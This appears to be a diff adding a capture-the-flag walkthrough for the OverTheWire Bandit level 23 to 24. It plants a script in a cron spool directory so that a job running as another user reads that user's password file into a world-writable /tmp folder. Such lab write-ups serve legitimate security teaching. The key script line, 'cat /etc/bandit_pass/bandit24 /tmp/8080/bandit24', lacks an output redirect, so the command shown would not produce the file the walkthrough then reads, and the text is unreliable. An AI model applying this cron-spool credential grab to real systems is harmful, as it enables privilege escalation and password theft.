@@ -1,0 +1,17 @@
+$ ls /etc/cron.d
+$ cat /etc/cron.d/cronjob_bandit24
+$ cat /usr/bin/cronjob_bandit24.sh
+$ ls -l /var/spool/
+$ mkdir /tmp/8080
+$ cd /tmp/8080
+$ chmod u=rwx,g=rwx,o=rwx /tmp/8080
+$ cat > /tmp/8080/script.sh << EOF
+#!/bin/sh
+cat /etc/bandit_pass/bandit24 /tmp/8080/bandit24
+EOF
+$ chmod u=rwx,g=rwx,o=rwx /tmp/8080/script.sh
+$ cp script.sh /var/spool/bandit24/
+$ sleep 60
+$ cat /tmp/8080/bandit24
+
+to solve this task we copy the bandit24 password file a folder readable by bandit23. this works because the cron is executed as the bandit24 user
